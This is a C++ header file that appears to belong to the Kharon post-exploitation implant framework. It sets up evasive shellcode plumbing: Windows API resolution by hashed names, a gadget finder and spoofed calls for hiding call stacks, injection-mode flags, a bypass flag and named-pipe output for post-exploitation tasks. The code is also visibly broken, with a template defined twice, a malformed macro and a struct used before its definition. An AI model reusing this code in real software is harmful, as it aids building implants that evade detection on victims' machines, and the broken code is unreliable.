#ifndef GENERAL_H
#define GENERAL_H

#include <win32.h>
#include <kharon.h>

#define PIPE_BUFFER_LENGTH  0x10000
#define declapi( x )       decltype( x ) * x
#define declfn             __attribute__( ( section( ".text$B" ) ) )

#define g_instance INSTANCE* self = []() -> INSTANCE* { \
    PEB* peb = NtCurrentPeb(); \
    for (ULONG i = 0; i < peb->NumberOfHeaps; i++) { \
        INSTANCE* potential_instance = reinterpret_cast<INSTANCE*>(peb->ProcessHeaps[i]); \
        if (potential_instance && potential_instance->postex.id == *((ULONG*)endptr()) ) { \
            return potential_instance; \
        } \
    } \
    return nullptr; \
}();

#define min(a, b) ((a) < (b) ? (a) : (b))

#define nt_current_threadid() HandleToUlong( NtCurrentTeb()->ClientId.UniqueThread )
#define last_error()          NtCurrentTeb()->LastErrorValue

template <typename T>
constexpr SIZE_T structcount() {
    SIZE_T count     = 0;
    SIZE_T structlen = sizeof( T );

    while ( structlen > count * sizeof( UPTR ) ) {
        count++;
    }

    return count;
}

#define rsl_imp( w, m ) { \
    for ( int i = 1; i < structcount<decltype( ->w, m )>(); i++ ) { \
        reinterpret_cast<UPTR*>( &w )[ i ] = load_api( m, reinterpret_cast<UPTR*>( &m )[ i ] ); \
    } \
}

extern "C" PVOID startptr();
extern "C" PVOID endptr();
extern "C" PVOID spoofcall( ... );

auto find_gadget(
    _In_ PVOID module_base,
    _In_ BYTE  reg_value
) -> PVOID;

auto load_api(
    _In_ const UPTR ModBase,
    _In_ const UPTR SymbHash
) -> UPTR;

auto load_module(
    _In_ const ULONG LibHash
) -> UPTR;

template <typename T>
constexpr SIZE_T structcount() {
    SIZE_T count     = 0;
    SIZE_T structlen = sizeof( T );

    while ( structlen > count * sizeof( UPTR ) ) {
        count++;
    }

    return count;
}

template <typename T = char>
inline auto declfn hashstr(
    _In_ const T* String
) -> UPTR {
    ULONG csthash = 0x515528a;
    BYTE  Value   = 0;

    while ( * String ) {
        Value = static_cast<BYTE>( *String++ );

        if ( Value >= 'a' ) {
            Value -= 0x20;
        }

        csthash ^= Value;
        csthash *= 0x01000193;
    }

    return csthash;
}

#define RangeHeadList( HEAD_LIST, TYPE, SCOPE ) \
{                                               \
    PLIST_ENTRY __Head = ( & HEAD_LIST );       \
    PLIST_ENTRY __Next = { 0 };                 \
    TYPE        Entry  = (TYPE)__Head->Flink;   \
    for ( ; __Head != (PLIST_ENTRY)Entry; ) {   \
        __Next = ((PLIST_ENTRY)Entry)->Flink;   \
        SCOPE                                   \
        Entry = (TYPE)(__Next);                 \
    }                                           \
}

#define KH_INJECT_INLINE   0x000
#define KH_INJECT_EXPLICIT 0x100
#define KH_INJECT_SPAWN    0x200

struct _INSTANCE {
    POSTEX_CTX postex;

    struct {
        PVOID  heap;
        PVOID  start;
        UPTR   size;
        HANDLE sync;
    } ctx;  

    struct {
        HANDLE handle;
    } pipe;
    
    struct {
        HANDLE handle;

        declapi( strlen );
        declapi( wcslen );
        declapi( wcscmp );
    } msvcrt;

    struct {
        HANDLE handle;

        declapi( NtClose );
        declapi( DbgPrint );

        declapi( NtProtectVirtualMemory );

        declapi( RtlAllocateHeap );
        declapi( RtlReAllocateHeap );
        declapi( RtlFreeHeap );

        declapi( NtGetContextThread );
        declapi( NtContinue );
        declapi( RtlCaptureContext );

        declapi( RtlAddVectoredExceptionHandler );
        declapi( RtlRemoveVectoredExceptionHandler );

        declapi( RtlInitializeCriticalSection );
        declapi( RtlEnterCriticalSection );
        declapi( RtlLeaveCriticalSection );

        declapi( RtlLookupFunctionEntry );
        declapi( RtlUserThreadStart );

        declapi( GetConsoleWindow );
        declapi( AllocConsoleWithOptions );
        declapi( FreeConsole );

        declapi( RtlExitUserProcess );
        declapi( RtlExitUserThread  );

        declapi( RtlRandomEx );
    } ntdll;

    struct {
        HANDLE handle;

        declapi( BaseThreadInitThunk );

        declapi( AllocConsoleWithOptions );

        declapi( GetProcAddress );
        declapi( GetModuleHandleA );
        declapi( LoadLibraryA );

        declapi( GetConsoleWindow );
        declapi( FreeConsole );

        declapi( CreatePipe );
        declapi( CreateNamedPipeW );
        declapi( ConnectNamedPipe );
        declapi( PeekNamedPipe );
        declapi( DisconnectNamedPipe );
        declapi( CreateFileW );
        declapi( WriteFile );
        declapi( ReadFile );
        declapi( FlushFileBuffers );
        declapi( SetStdHandle );
        declapi( GetStdHandle );
        declapi( WaitForSingleObject );

        declapi( CreateThread );

        declapi( SetEvent );
        declapi( CreateEventW );
    } kernel32;
};
typedef _INSTANCE INSTANCE;

struct _PARSER {
    CHAR*   Original;
    CHAR*   Buffer;
    UINT32  Size;
    UINT32  Length;
};
typedef _PARSER PARSER;

namespace mm {
    template <typename T>   
    auto declfn alloc(
        UPTR size
    ) -> T {
        g_instance
        return reinterpret_cast<T>( self->ntdll.RtlAllocateHeap( self->ctx.heap, HEAP_ZERO_MEMORY, size ) );
    }

    template <typename T>
    auto declfn realloc(
        T    block,
        UPTR size
    ) -> T {
        g_instance
        return reinterpret_cast<T>( self->ntdll.RtlReAllocateHeap( self->ctx.heap, HEAP_ZERO_MEMORY, block, size ) );
    }

    static auto declfn free( PVOID Block ) -> BOOL {
        g_instance
        return self->ntdll.RtlFreeHeap( self->ctx.heap, 0, Block );
    }

    auto copy( _In_ PVOID dst, _In_ PVOID src, _In_ UPTR size ) -> PVOID;
    auto set(  _In_ PVOID ptr, _In_ UCHAR val, _In_ UPTR size ) -> void;
    auto zero( _In_ PVOID ptr, _In_ UPTR size ) -> void;
}

typedef struct _POSTEX_CTX {
    ULONG   id;
    WCHAR* pipename;
    ULONG  pipename_len;
    INT16  execmethod;
    INT16  bypassflag;
    INT8   spoof;
    PBYTE  args;
    ULONG  argc;
} POSTEX_CTX;

namespace parser {
    auto create( _In_ PARSER* parser, _In_ PBYTE args, _In_ ULONG argc ) -> VOID;
    auto header( _In_ PVOID buff, _Out_ POSTEX_CTX* postex ) -> VOID;

    auto byte(  _In_ PARSER* parser ) -> BYTE;
    auto int16( _In_ PARSER* parser ) -> INT16;
    auto int32( _In_ PARSER* parser ) -> INT32;
    auto int64( _In_ PARSER* Parser ) -> INT64;

    auto pad( _In_ PARSER* parser, _Out_ ULONG size ) -> PBYTE;
    auto bytes( _In_ PARSER* parser,  _Out_ ULONG* size = nullptr ) -> PBYTE;
    auto str(   _In_ PARSER* parser,  _Out_ ULONG* size = nullptr ) -> PCHAR;
    auto wstr(  _In_ PARSER* parser,  _Out_ ULONG* size = nullptr ) -> PWCHAR;

    auto destroy( _In_ PARSER* parser ) -> BOOL;
}

#endif // GENERAL_H